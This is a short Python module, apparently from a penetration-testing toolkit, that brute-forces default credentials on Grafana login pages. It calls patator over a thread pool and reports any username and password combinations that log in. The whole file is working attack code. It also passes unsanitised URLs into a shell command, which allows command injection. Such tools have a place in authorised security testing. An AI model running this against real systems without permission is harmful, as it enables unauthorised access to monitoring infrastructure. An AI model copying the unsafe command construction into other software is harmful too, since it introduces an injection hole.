#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import socket
import subprocess

from multiprocessing.dummy import Pool as ThreadPool
from utils import *

class GrafanaModule():
	def __init__(self, lst, nb_threads):
		self.urls = lst
		self.urn = '/login'
		self.wordlistPath = 'modules/config/grafana.txt'
		self.regex = r"200.*?\|(.*?)\|"
		self.urls = check_up_services(lst)
		with ThreadPool(nb_threads) as pool:
			pool.map(self.tryDefaultCredsPatator, self.urls)

	def tryDefaultCredsPatator(self, url):
		print_info("Trying default credentials on "+url)
		output = subprocess.getoutput("python3 patator/patator.py http_fuzz url='"+url+self.urn+\
			"' method=POST body='{\"user\":\"COMBO00\",\"email\":\"\",\"password\":\"COMBO01\"}' user_pass=COMBO00:COMBO01 0='"\
			+self.wordlistPath+"' follow=1 accept_cookie=1 auto_urlencode=0 header=\"Content-Type: application/json;charset=utf-8\" -x ignore:code=401")
		if output.find("HTTP/1.1 200") > 0:
			matches = re.search(self.regex, output)
			if matches:
				print_success("[%s] : (%s)" % (url, matches.group(1).strip()))
